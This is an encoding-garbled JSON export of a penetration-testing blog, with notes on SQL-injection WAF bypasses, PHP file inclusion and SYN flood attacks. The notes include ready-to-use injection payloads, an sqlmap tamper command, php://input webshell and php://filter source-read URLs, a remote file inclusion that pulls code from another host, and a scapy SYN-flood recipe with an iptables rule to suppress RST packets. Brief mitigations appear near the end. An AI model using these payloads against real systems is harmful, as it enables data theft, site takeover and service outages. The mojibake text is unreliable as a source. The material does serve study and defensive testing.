åœ¨mysqlä¸­ï¼Œå¯ä»¥åˆ©ç”¨/!/åŒ…å«å…³é”®è¯è¿›è¡Œç»•è¿‡ï¼Œåœ¨mysqlä¸­è¿™ä¸ªä¸æ˜¯æ³¨é‡Šï¼Œè€Œæ˜¯å–æ¶ˆæ³¨é‡Šçš„å†…å®¹ã€‚æµ‹è¯•æœ€æ–°ç‰ˆæœ¬çš„WAFå¯ä»¥å®Œç¾ç»•è¿‡ã€‚ å¦‚: GET /pen/news.php?id=1 union select user,password frommysql.user å¯ä»¥æ”¹ä¸º: GET /pen/news.php?id=1 /!union//!select/ user,password /!from/ mysql.user ç»•è¿‡ç­–ç•¥å››ï¼š ä¹Ÿå¯ä»¥å°è¯•seelct~ select~1 select! select@ç­‰ç»•è¿‡æˆåŠŸï¼Œ ï¼ˆ5ï¼‰ç©ºæ ¼æ›¿æ¢æ³• æŠŠç©ºæ ¼æ›¿æ¢æˆ%0a//å¯ä»¥ç»•è¿‡æœ€æ–°ç‰ˆæœ¬WAF, åœ¨Pangolinä¸­ ç‚¹å‡» ç¼–è¾‘â€“ é…ç½®â€“ é«˜çº§â€“ é€‰æ‹©æ›¿æ¢ç©ºæ ¼ä½¿ç”¨â€“ å¡«ä¸Š%0a//å³å¯ http://192.168.0.142:8080/sql.php?id=1%20union%23%0aselect%23%0a1,user(),3,4,5 ï¼ˆ6ï¼‰ä½¿ç”¨å¤§å°å†™ â€‹ http://www.***.com/index.php?page_id=-15uNIoN sELecT 1,2,3,4â€¦. ï¼ˆ7ï¼‰å…³é”®å­—æ›¿æ¢ â€‹ http://www.***.com/index.php?page_id=-15UNIunionON SELselectECT 1,2,3,4â€¦. â€‹ æ­¤æ–¹æ³•é€‚ç”¨äºä¸€äº›ä¼šæŠŠunion selectæ›¿æ¢æ‰çš„WAFï¼Œç»è¿‡WAFè¿‡æ»¤åå°±ä¼šå˜æˆunion select 1,2,3,4â€¦. ï¼ˆ8ï¼‰ç¼–ç ä¸æ³¨é‡Šç»“åˆ http://www.***.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4â€¦ http://192.168.0.142:8080/sql.php?id=1/!50000/union/!50000/select/!50000/1,user(),3,4,5 ä¹Ÿå¯ä»¥è¿™æ · http://192.11.22.55/sqli/Less-1/?id=1&#39; and /!1=1/ %23 (WAFä¸æ‹¦æˆª) â€‹ Uæ›¿æ¢ä¸º%55ï¼ŒSæ›¿æ¢ä¸º%53 åœ¨ union å’Œ select ä¹‹é—´æ·»åŠ æ³¨é‡Š/**/ æ‰‹å·¥è¿›è¡ŒåŠ æ³¨é‡Šè¿›è¡Œæ³¨å…¥å¤ªæ…¢ï¼Œä¸€èˆ¬æˆ‘ä»¬é€šè¿‡Sqlmapè¿™ç±»å·¥å…·æ¥å®ç°è‡ªåŠ¨æ³¨å…¥: sqlmap.py -u â€œURLâ€â€“tamper=â€versionedmorekeywords.pyâ€ â€“dealy=1 ï¼ˆ9ï¼‰åˆ©ç”¨WAFæœ¬èº«çš„åŠŸèƒ½ç»•è¿‡ â€‹ å‡å¦‚ä½ å‘ç°WAFä¼šæŠŠâ€*â€æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§æ¥è¿›è¡Œç»•è¿‡ â€â€â€http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4â€¦. å…¶å®ƒæ–¹æ³•-15+(uNioN)+(sElECt)â€¦.-15+(uNioN+SeleCT)+â€¦-15+(UnI)(oN)+(SeL)(ecT)+â€¦.-15+union (select1,2,3,4â€¦) ï¼ˆ10ï¼‰ä½¿ç”¨å…¶ä»–å˜é‡æˆ–è€…å‘½ä»¤å¯¹æ³¨å…¥è¯­å¥è¿›è¡Œæ›¿æ¢ COMMAND | WHAT TO USE INSTEAD @@version | version() concat() | concat_ws() group_concat() | concat_ws() = | like è¿™ç§åœ¨å®é™…ç»•è¿‡WAFè¿‡ç¨‹ä¸­å¾ˆæœ‰ä½œç”¨ï¼Œå¦‚ä¸‹å®ä¾‹: http://172.16.20.18:8080/dvwa/vulnerabilities/sqli/?id=1%27%20%55%4e%49%4f%4e%20/*!%09%53%45%4c%45%43%54*/%20user(),database()+--+&amp;Submit=Submit wafå¸¸è§ç‰¹å¾å®¡è®¡è®¾å¤‡ï¼šç”¨æ¥æˆªè·æ‰€æœ‰HTTPæ•°æ®æˆ–è€…ä»…ä»…æ»¡è¶³æŸäº›è§„åˆ™çš„ä¼šè¯ è®¿é—®æ§åˆ¶è®¾å¤‡ï¼šç”¨æ¥æ§åˆ¶å¯¹Webåº”ç”¨çš„è®¿é—®ï¼Œæ—¢åŒ…æ‹¬ä¸»åŠ¨å®‰å…¨æ¨¡å¼ä¹ŸåŒ…æ‹¬è¢«åŠ¨å®‰å…¨æ¨¡å¼ æ¶æ„/ç½‘ç»œè®¾è®¡å·¥å…·ï¼šå½“è¿è¡Œåœ¨åå‘ä»£ç†æ¨¡å¼ï¼Œä»–ä»¬è¢«ç”¨æ¥åˆ†é…èŒèƒ½ï¼Œé›†ä¸­æ§åˆ¶ï¼Œè™šæ‹ŸåŸºç¡€ç»“æ„ç­‰ã€‚ WEBåº”ç”¨åŠ å›ºå·¥å…·ï¼šè¿™äº›åŠŸèƒ½å¢å¼ºè¢«ä¿æŠ¤Webåº”ç”¨çš„å®‰å…¨æ€§ï¼Œå®ƒä¸ä»…èƒ½å¤Ÿå±è”½WEBåº”ç”¨å›ºæœ‰å¼±ç‚¹ï¼Œè€Œä¸”èƒ½å¤Ÿä¿æŠ¤WEBåº”ç”¨ç¼–ç¨‹é”™è¯¯å¯¼è‡´çš„å®‰å…¨éšæ‚£ã€‚ wafå¸¸è§ç‰¹ç‚¹â€¢ å¼‚å¸¸æ£€æµ‹åè®®ï¼šæ‹’ç»ä¸ç¬¦åˆHTTPæ ‡å‡†çš„è¯·æ±‚ â€¢ å¢å¼ºçš„è¾“å…¥éªŒè¯ï¼šä»£ç†å’ŒæœåŠ¡ç«¯çš„éªŒè¯ï¼Œè€Œä¸åªæ˜¯é™äºå®¢æˆ·ç«¯éªŒè¯ â€¢ ç™½åå•&amp;é»‘åå•ï¼šç™½åå•é€‚ç”¨äºç¨³å®šçš„Weåº”ç”¨ï¼Œé»‘åå•é€‚åˆå¤„ç†å·²çŸ¥é—®é¢˜ â€¢ åŸºäºè§„åˆ™å’ŒåŸºäºå¼‚å¸¸çš„ä¿æŠ¤ï¼šåŸºäºè§„åˆ™æ›´å¤šçš„ä¾èµ–é»‘åå•æœºåˆ¶ï¼ŒåŸºäºå¼‚å¸¸æ›´ä¸ºçµæ´» â€¢ çŠ¶æ€ç®¡ç†ï¼šé‡ç‚¹è¿›è¡Œä¼šè¯ä¿æŠ¤ â€¢ å¦è¿˜æœ‰ï¼šCookieä¿æŠ¤ã€æŠ—å…¥ä¾µè§„é¿æŠ€æœ¯ã€å“åº”ç›‘è§†å’Œä¿¡æ¯æ³„éœ²ä¿æŠ¤ç­‰ WAFçš„è¯†åˆ«æ‰«æå™¨â€¢ æ‰«æå™¨æŒ‡çº¹(headå­—æ®µ/è¯·æ±‚å‚æ•°å€¼)ï¼Œä»¥wvsä¸ºä¾‹ï¼Œä¼šæœ‰å¾ˆæ˜æ˜¾çš„Acunetix åœ¨å†…çš„æ ‡è¯† â€¢ å•IP+ cookieæŸæ—¶é—´æ®µå†…è§¦å‘è§„åˆ™æ¬¡æ•° â€¢éšè—çš„é“¾æ¥æ ‡ç­¾ç­‰ â€¢Cookieæ¤å…¥ â€¢éªŒè¯ç éªŒè¯ï¼Œæ‰«æå™¨æ— æ³•è‡ªåŠ¨å¡«å……éªŒè¯ç  â€¢å•IPè¯·æ±‚æ—¶é—´æ®µå†…Webserverè¿”å›httpçŠ¶æ€404æ¯”ä¾‹ï¼Œ æ‰«æå™¨æ¢æµ‹æ•æ„Ÿç›®å½•åŸºäºå­—å…¸ï¼Œæ‰¾ä¸åˆ°æ–‡ä»¶åˆ™è¿”å›404 SQLä¿®å¤å»ºè®®â€¢ å¸¸ç”¨å¾—SQLæ³¨å…¥æ¼æ´å¾—ä¿®å¤æ–¹æ³•æœ‰ä¸¤ç§ â€¢ 1.è¿‡æ»¤å±é™©å­—ç¬¦â€¢ å¤šæ•°CMSéƒ½é‡‡ç”¨è¿‡æ»¤å­—ç¬¦çš„æ–¹å¼ï¼Œä¾‹å¦‚ï¼Œé‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…unionã€ sleepã€load_fileç­‰å…³é”®å­—ï¼Œå¦‚æœåŒ¹é…åˆ°ï¼Œåˆ™é€€å‡ºç¨‹åºã€‚ â€¢ 2.ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥â€¢ å…¶å®ä½¿ç”¨PDOé¢„ç¼–è¯‘è¯­å¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸è¦å°†å˜é‡ç›´æ¥æ‹¼æ¥åˆ°PDOè¯­ å¥ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨å ä½ç¬¦è¿›è¡Œæ•°æ®åº“çš„å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€æŸ¥è¯¢ã€‚","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","date":"2020-04-12T14:30:50.000Z","updated":"2020-09-20T08:58:38.392Z","comments":true,"path":"2020/04/12/æ–‡ä»¶åŒ…å«/","link":"","permalink":"https://zhangyanlady.github.io/2020/04/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"æ€»ç»“å›¾ æœ¬åœ°åŒ…å«ä½¿ç”¨includeæ–‡ä»¶ ä»£ç è¡¨ç¤ºä¸Šä¼ çš„æ–‡ä»¶éƒ½ä»¥phpæ‰§è¡Œ è¿œç¨‹åŒ…å«éœ€è¦æŠŠallow_url_include=onï¼Œmagic_quotes_gpc=off åŒ…å«æ—¥å¿—æ–‡ä»¶ å½“æŸä¸ªPHPæ–‡ä»¶å­˜åœ¨æœ¬åœ°åŒ…å«æ¼æ´ï¼Œè€Œå´æ— æ³•ä¸Šä¼ æ­£å¸¸æ–‡ä»¶ï¼Œè¿™å°±æ„å‘³è¿™æœ‰åŒ…å«æ¼æ´å´ä¸èƒ½æ‹¿æ¥åˆ©ç”¨ï¼Œè¿™æ—¶æ”»å‡»è€…å°±æœ‰å¯èƒ½ä¼šåˆ©ç”¨apacheæ—¥å¿—æ–‡ä»¶æ¥å…¥ä¾µã€‚ ApacheæœåŠ¡å™¨è¿è¡Œåä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯access.log(è®¿é—®æ—¥å¿—)å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼Œapacheçš„æ—¥å¿—æ–‡ä»¶è®°å½•ä¸‹æˆ‘ä»¬çš„æ“ä½œï¼Œå¹¶ä¸”å†™åˆ°è®¿é—®æ—¥å¿—æ–‡ä»¶access.logä¹‹ä¸­ å¼€å¯apacheæ—¥å¿—æ–¹æ³•æ‰“å¼€é…ç½®æ–‡ä»¶-httpd-confï¼Œæ‰“å¼€httpd.confé…ç½®æ–‡ä»¶ï¼Œ ç¬¬299è¡Œï¼š \\1. ##CustomLog â€œlogs/access.logâ€ common å»æ‰å‰è¾¹çš„ # ï¼Œå¹¶é‡å¯apacheã€‚ å†™å…¥ä¸€å¥è¯æœ¨é©¬ PHPåŒ…å«å†™æ–‡ä»¶æ„é€ URL: http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input, å¹¶ä¸”æäº¤postæ•°æ®ä¸º: â€‹ æ³¨æ„:åªæœ‰åœ¨allow _url_includeä¸ºonçš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨,å¦‚æœæƒ³æŸ¥çœ‹å›æ˜¾ç»“æœé‚£å¿…é¡»åœ¨C:\\php\\php-5.2.14-Win32ä¸‹æ‰¾åˆ°php-apache2handler.iniæ‰“å¼€ï¼ŒæŸ¥æ‰¾display_funtions=proc-open,oppen,exec,systemâ€¦â€¦.åˆ æ‰systemé‡å¯apacheã€‚ PHPåŒ…å«è¯»æ–‡ä»¶http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php è®¿é—®URL,å¾—åˆ°ç»è¿‡base64åŠ å¯†åçš„å­—ç¬¦ä¸²: åŒ…å«æˆªæ–­ç»•è¿‡ è¿™ç§æ–¹æ³•åªé€‚åˆäºmagic_quotes_gpc=offçš„æ—¶å€™ï¼Œ phpç‰ˆæœ¬å°äº5.3.4ï¼Œå¯é€šè¿‡%00æˆªæ–­ç»•è¿‡ï¼Œä¸è¿‡ç°åœ¨å·²ç»å¾ˆéš¾è§åˆ°äº†ï¼Œæ¯”å¦‚ï¼šindex.php?file=info.txt//////////////â€¦â€¦â€¦â€¦è¶…è¿‡ä¸€å®šæ•°æ®çš„/ã€‚ str_replaceã€fnmatchæ¶µæ•°ç»•è¿‡str_replaceå‡½æ•°ç»•è¿‡:ä½¿ç”¨str_replaceå‡½æ•°æ˜¯æå…¶ä¸å®‰å…¨çš„ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡æ›¿æ¢è§„åˆ™ã€‚ ä¾‹å¦‚page=hthttp://tp://192.168.0.103/phpinfo.txtæ—¶ï¼Œstr_replaceå‡½æ•°ä¼šå°†http://åˆ é™¤ï¼Œäºæ˜¯page=http://192.168.0.103/phpinfo.txtï¼ŒæˆåŠŸæ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚ åŒæ—¶ï¼Œå› ä¸ºæ›¿æ¢çš„åªæ˜¯â€œ../â€ã€â€œ..\\â€ï¼Œæ‰€ä»¥å¯¹é‡‡ç”¨ç»å¯¹è·¯å¾„çš„æ–¹å¼åŒ…å«æ–‡ä»¶æ˜¯ä¸ä¼šå—åˆ°ä»»ä½•é™åˆ¶çš„ã€‚ 1ã€æœ¬åœ°æ–‡ä»¶åŒ…å« http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=â€¦/./777.jpg 2ã€ç»å¯¹è·¯å¾„ä¸å—ä»»ä½•å½±å“http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=c:/2.txt 3ã€è¿œç¨‹æ–‡ä»¶åŒ…å«:http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.0.106:8080/index.php fnmatchå‡½æ•°ç»•è¿‡if(!fnmatch(â€œfile*â€,$file)&amp;&amp;$file!=â€include.phpâ€),å½“æ–‡ä»¶æ—¢ä¸æ˜¯â€include.phpâ€ä¹Ÿä¸æ˜¯â€file*â€ï¼ˆæ–‡ä»¶åfileå¼€å¤´ï¼‰æ—¶æ‰æŠ›å‡ºé”™è¯¯ï¼Œåä¹‹æ„æ€ï¼Œå¦‚æœæ–‡ä»¶åç¬¦åˆå…¶ä¸­ä¸€ä¸ªæ¡ä»¶æ—¢å¯ä»¥ã€‚page=file:///C:/xampp/htdocs/dvwa/php.ini åˆšå¥½æ»¡è¶³â€file*â€ï¼ˆæ–‡ä»¶åfileå¼€å¤´ï¼‰ã€‚ http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=file:///C:/2.txt phpå†…ç½®åè®® File:// è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ htt[p:// è®¿é—®HTTP(s)ç½‘å€ ftp:// è®¿é—®FTP(s)URLS php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ(I/o streams) zlib:// å‹ç¼©æµ data:// æ•°æ®(RFC2397) ssh2:// Secure Shell 2 expect:// å¤„ç†äº¤äº’å¼çš„æµ glob:// æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DDOSæ”»å‡»","slug":"DDOSæ”»å‡»","date":"2020-03-19T13:17:42.000Z","updated":"2020-09-20T09:01:19.090Z","comments":true,"path":"2020/03/19/DDOSæ”»å‡»/","link":"","permalink":"https://zhangyanlady.github.io/2020/03/19/DDOS%E6%94%BB%E5%87%BB/","excerpt":"","text":"DDOSæ˜¯DOSæ”»å‡»ä¸­çš„ä¸€ç§æ–¹æ³•ã€‚å‚è€ƒã€ï¼šhttps://baijiahao.baidu.com/s?id=1603040969904482717&amp;wfr=spider&amp;for=pc 123456 DoSï¼šæ˜¯Denial of Serviceçš„ç®€ç§°ï¼Œå³æ‹’ç»æœåŠ¡ï¼Œä¸æ˜¯DOSæ“ä½œç³»ç»Ÿï¼Œé€ æˆDoSçš„æ”»å‡»è¡Œä¸ºè¢«ç§°ä¸ºDoSæ”»å‡»ï¼Œå…¶ç›®çš„æ˜¯ä½¿è®¡ç®—æœºæˆ–ç½‘ç»œæ— æ³•æä¾›æ­£å¸¸çš„æœåŠ¡ã€‚æœ€å¸¸è§çš„DoSæ”»å‡»æœ‰è®¡ç®—æœºç½‘ç»œå¸¦å®½æ”»å‡»å’Œè¿é€šæ€§æ”»å‡» åˆ©ç”¨ç¨‹åºæ¼æ´æˆ–ä¸€å¯¹ä¸€èµ„æºè€—å°½çš„Denial of Serviceæ‹’ç»æœåŠ¡ DDOSï¼šåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡(DDoS:Distributed Denial of Service)æ”»å‡»æŒ‡å€ŸåŠ©äºå®¢æˆ·&#x2F;æœåŠ¡å™¨æŠ€æœ¯ï¼Œå°†å¤šä¸ªè®¡ç®—æœºè”åˆèµ·æ¥ä½œä¸ºæ”»å‡»å¹³å°ï¼Œå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªç›®æ ‡å‘åŠ¨DDoSæ”»å‡»ï¼Œä»è€Œæˆå€åœ°æé«˜æ‹’ç»æœåŠ¡æ”»å‡»çš„å¨åŠ›ã€‚ä¸€å¯¹ä¸€çš„æ”»å‡»å®Œå…¨æ‹¼å„è‡ªçš„èµ„æºï¼Œæ•ˆæœå·®å¤šå¯¹ä¸€çš„æ”»å‡»æ±‡èšèµ„æºèƒ½åŠ›ï¼Œé‡ç‚¹åœ¨äºé‡å¤§ï¼Œå±äºèµ„æºè€—å°½å‹ Dosåˆ†ç±»Dç½‘ç»œåŸºäºå·¨é‡çš„Floodè€—å°½ç›®æ ‡ç½‘ç»œå¸¦å®½èµ„æºå¦‚ï¼šICMP Flood, UDP Flood Dåè®®æ”»å‡»åè®®æ¼æ´å‘èµ·çš„æ‹’ç»æœåŠ¡æ”»å‡»å¦‚ï¼šSyn Floodã€Ping of Deathã€ARPã€DNSã€802.11ã€SSL Dåº”ç”¨é’ˆå¯¹åº”ç”¨è½¯ä»¶å’Œæ“ä½œç³»ç»Ÿæ¼æ´å‘èµ·çš„æ‹’ç»æœåŠ¡æ”»å‡»å¤§é‡é¢‘ç¹è®¿é—®æ¶ˆè€—ç³»ç»Ÿèµ„æºä¸¥é‡çš„åº”ç”¨ï¼ˆCC)é€šå¸¸è¡¨ç°ä¸ºæ“ä½œç³»ç»Ÿè¿è¡Œæ­£å¸¸ï¼Œç½‘ç»œæµé‡ä¸å¤§ï¼Œä½†æœåŠ¡åœæ­¢å“åº”å¯ä»¥æ˜¯ä¸€å‡»æ¯™å‘½çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯è€—å°½ç›®æ ‡èµ„æºçš„ä»¥ä¸Šåˆ†ç±»å¹¶ä¸ä¸¥è°¨ï¼Œä¸å¿…å¤ªè¿‡æ‰§ç€äºæ­¤ æ€»ç»“ ä»æ”»å‡»è€…åˆ°è¢«å®³è€…æµç¨‹1ç½‘ç»œ-&gt;FW-&gt;æœåŠ¡å™¨OS-&gt;æœåŠ¡åº”ç”¨ èµ„æºè€—å°½å‹æ”»å‡»æ–¹é¢12345ç½‘ç»œï¼šå¸¦å®½FW:ååé‡ã€å¹¶å‘è¿æ¥æœåŠ¡å™¨ï¼šCPUã€å†…å­˜ã€I&#x2F;Oåº”ç”¨ï¼šå¤„ç†è¯·æ±‚èƒ½åŠ›ï¼Œå¯¹OSèµ„æºçš„ä½¿ç”¨æƒ ç¨‹åºæ¼æ´æ”»å‡»12ç¼“å†²åŒºæº¢å‡ºåè®®ã€ç¨‹åºé€»è¾‘æ¼æ´ æ”»å‡»åŸç†ä¸æ”»å‡»å±å®³æŒ‰ç…§æ”»å‡»å¯¹è±¡çš„ä¸åŒï¼Œå°†æ”»å‡»åŸç†å’Œæ”»å‡»å±å®³çš„åˆ†æåˆ†æˆ3ç±»ï¼Œåˆ†åˆ«æ˜¯æ”»å‡»ç½‘ç»œå¸¦å®½èµ„æºã€åº”ç”¨ä»¥åŠç³»ç»Ÿã€‚ æ”»å‡»ç½‘ç»œå¸¦å®½èµ„æºï¼š æ”»å‡»ç½‘ç»œå¸¦å®½èµ„æº æ”»å‡»ç³»ç»Ÿèµ„æºï¼š æ”»å‡»ç³»ç»Ÿèµ„æº æ”»å‡»åº”ç”¨èµ„æºï¼š æ”»å‡»åº”ç”¨èµ„æº SYN FLOODæ”»å‡» åˆ©ç”¨æœåŠ¡å™¨çš„è¿æ¥ç¼“å†²åŒºï¼ˆBacklog Queueï¼‰ï¼Œåˆ©ç”¨ç‰¹æ®Šçš„ç¨‹åºï¼Œè®¾ç½®TCPçš„Headerï¼Œå‘æœåŠ¡å™¨ç«¯ä¸æ–­åœ°æˆå€å‘é€åªæœ‰SYNæ ‡å¿—çš„TCPè¿æ¥è¯·æ±‚ã€‚å½“æœåŠ¡å™¨æ¥æ”¶çš„æ—¶å€™ï¼Œéƒ½è®¤ä¸ºæ˜¯æ²¡æœ‰å»ºç«‹èµ·æ¥çš„è¿æ¥è¯·æ±‚ï¼Œäºæ˜¯ä¸ºè¿™äº›è¯·æ±‚å»ºç«‹ä¼šè¯ï¼Œæ’åˆ°ç¼“å†²åŒºé˜Ÿåˆ—ä¸­ã€‚ å¦‚æœä½ çš„SYNè¯·æ±‚è¶…è¿‡äº†æœåŠ¡å™¨èƒ½å®¹çº³çš„é™åº¦ï¼Œç¼“å†²åŒºé˜Ÿåˆ—æ»¡ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¸å†æ¥æ”¶æ–°çš„è¯·æ±‚äº†ã€‚å…¶ä»–åˆæ³•ç”¨æˆ·çš„è¿æ¥éƒ½è¢«æ‹’ç»æ‰ã€‚å¯ä»¥æŒç»­ä½ çš„SYNè¯·æ±‚å‘é€ï¼Œç›´åˆ°ç¼“å†²åŒºä¸­éƒ½æ˜¯ä½ çš„åªæœ‰SYNæ ‡è®°çš„è¯·æ±‚ã€‚ æœ€é€šä¿—çš„ä¾‹å­ï¼Œä¸‹é¢çš„å›¾ç‰‡æ˜¯TCPçš„é€šä¿¡çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¦‚æœè¯´æ”»å‡»ç«¯ï¼Œå‘é€å®Œç¬¬ä¸€æ¬¡æ¡æ‰‹çš„æ•°æ®åï¼Œç„¶åå°±â€œæ¶ˆå¤±â€äº†ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šä¸æ–­çš„å‘é€ç¬¬äºŒæ¬¡æ¡æ‰‹çš„æ•°æ®ï¼Œå¯æ˜¯æ”»å‡»ç«¯çš„äººæ‰¾ä¸åˆ°äº†ã€‚äºæ˜¯ï¼ŒæœåŠ¡å™¨çš„èµ„æºå¤§é‡è¢«æ¶ˆè€—ï¼Œç›´åˆ°æ­»æœºä¸ºæ­¢ã€‚å½“ç„¶è¦å®Œå…¨å¼„æ‡‚æœºåˆ¶ï¼Œéœ€è¦å¯¹TCPæœ‰ç›¸å½“æ·±å…¥çš„äº†è§£ã€‚ TCPå»ºç«‹è¿æ¥ï¼šä¸‰æ¬¡æ¡æ‰‹1.client: syn2.server: syn+ack3.client: ack å®éªŒåŸºäºpython2.7ç‰ˆæœ¬ 1#apt-get install python-gnuplot å®‰è£…scapyç›¸å…³ç»„ä»¶ ç„¶åä½¿ç”¨æ”»å‡»è„šæœ¬æ”»å‡»è„šæœ¬ï¼š 1.&#x2F;syn_flood.py -iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 1.1.1.1 -j DROP -netstat -n I awk â€˜&#x2F;^ tcp&#x2F; &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;â€˜ Windowsç³»ç»Ÿé»˜è®¤åŠå¼€è¿æ¥æ•°10ä¸ªä½¿ç”¨æ–¹æ³•ï¼š â€“ i=IP() å®šä¹‰iå˜é‡ï¼ˆæ³¨æ„IPå¤§å°å†™ï¼Œä¸€å®šè¦å¤§å†™ï¼‰â€“ i.display() æ˜¾ç¤ºipåŒ…å¤´ç”¨æ³•â€“ i.dst=â€1.1.1.1â€ ç›®çš„åœ°å€â€“ t=TCP() é‡‡ç”¨tcpåè®®å‘åŒ…â€“ t.display () æŸ¥çœ‹ç”¨æ³•â€“ t.dport=3389 æ”»å‡»è¿œç¨‹3389ç«¯å£â€“ sr1(i/t,verbose=1,timeout=3) å‘é€æ•°æ®åŒ…ï¼ˆï¼‰â€“ sr1(IP(dst=1.1.1.1)/TCP()) å½“å‡ºç°è¿™ç§æƒ…å†µæ—¶ æˆ‘ä»¬å‘ä¸€ä¸ªåŒ…é‡Šæ”¾ä¸€ä¸ªè¿æ¥ï¼Œè¿™ç§è¾¾ä¸åˆ°æ”»å‡»éƒŠæœã€‚è¦æ„æˆæ”»å‡»æ•ˆæœå¯ä»¥é€šè¿‡iptablesé™æ­¢å‘é€RSTåŒ…ã€‚è¿™æ ·å°±å¯ä»¥è¾¾åˆ°æ”»å‡»éƒŠæœã€‚iptableså†™æ³•å¦‚ä¸‹ï¼š 1#iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.21.117 -j DROP é‡æ–°å‘åŒ…ä¼šå‘ç° SYN Floodé˜²å¾¡å‰æ–‡æè¿°è¿‡ï¼ŒSYN Floodæ”»å‡»å¤§é‡æ¶ˆè€—æœåŠ¡å™¨çš„CPUã€å†…å­˜èµ„æºï¼Œå¹¶å æ»¡SYNç­‰å¾…é˜Ÿåˆ—ã€‚ç›¸åº”çš„ï¼Œæˆ‘ä»¬ä¿®æ”¹å†…æ ¸å‚æ•°å³å¯æœ‰æ•ˆç¼“è§£ã€‚ä¸»è¦å‚æ•°å¦‚ä¸‹ï¼š 12345net.ipv4.tcp_syncookies &#x3D; 1net.ipv4.tcp_max_syn_backlog &#x3D; 8192net.ipv4.tcp_synack_retries &#x3D; 2 åˆ†åˆ«ä¸ºå¯ç”¨SYN Cookieã€è®¾ç½®SYNæœ€å¤§é˜Ÿåˆ—é•¿åº¦ä»¥åŠè®¾ç½®SYN+ACKæœ€å¤§é‡è¯•æ¬¡æ•°ã€‚ SYN Cookieçš„ä½œç”¨æ˜¯ç¼“è§£æœåŠ¡å™¨èµ„æºå‹åŠ›ã€‚å¯ç”¨ä¹‹å‰ï¼ŒæœåŠ¡å™¨åœ¨æ¥åˆ°SYNæ•°æ®åŒ…åï¼Œç«‹å³åˆ†é…å­˜å‚¨ç©ºé—´ï¼Œå¹¶éšæœºåŒ–ä¸€ä¸ªæ•°å­—ä½œä¸ºSYNå·å‘é€SYN+ACKæ•°æ®åŒ…ã€‚ç„¶åä¿å­˜è¿æ¥çš„çŠ¶æ€ä¿¡æ¯ç­‰å¾…å®¢æˆ·ç«¯ç¡®è®¤ã€‚å¯ç”¨SYN 